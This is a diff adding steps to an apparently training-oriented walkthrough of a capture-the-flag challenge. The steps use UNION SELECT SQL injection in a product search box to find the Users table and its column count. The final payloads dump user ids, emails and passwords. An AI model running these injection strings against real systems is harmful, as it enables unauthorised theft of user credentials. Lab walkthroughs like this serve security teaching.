@@ -20,4 +20,40 @@
 
 6. We see now that the entire list of products has been dumped. Now comes the fun part, crafting a **UNION SELECT** statement that will pull data from the user's table in the database. 
 
-7. 
+7. What we're going to do is inject our UNION statement between the `'))` and the `--`. We'll start with this search:  `')) UNION SELECT * FROM x--` 
+
+8. We see that t fails with a SQLITE_ERROR: no such table: x. This is because there isn't a table named **x** but we know our query worked. 
+
+![](images/5.PNG)
+
+ 9. However, we can easily guess the table name so let's search for `')) UNION SELECT * FROM Users--`
+ 
+![](images/6.PNG)
+
+ 10. We see that it fails with a promising SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns which least confirms the table name.
+
+ 11. The next step in a UNION SELECT-attack is typically to find the right number of returned columns. As the Search Results table in the UI has 3 columns displaying data, it will probably at least be three. Keep adding columns until no more SQLITE_ERROR occurs (or at least it becomes a different one):
+  
+- `')) UNION SELECT '1' FROM Users--` fails with number of result columns error
+
+- `')) UNION SELECT '1', '2' FROM Users--` fails with number of result columns error
+
+ - `')) UNION SELECT '1', '2', '3' FROM Users--` fails with number of result columns error
+
+ - (...)
+
+ - `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM Users--` still fails with number of result columns error
+
+ - `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--` finally gives you a response back with an extra element
+
+![](images/7.PNG)
+
+ 12. Next get rid of the unwanted product results changing the query into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--` leaving only the "**UNION**ed" element in the result set
+
+ ![](images/8.PNG)
+
+ 13. The last step is to replace the fixed values with correct column names. You could guess those or derive them from the RESTful API results or remember them from previously seen SQL errors while attacking the Login form.
+
+ 14. Searching for `qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--` solves the challenge giving you a the list of all user data in convenient JSON format.
+
+  ![](images/9.PNG)
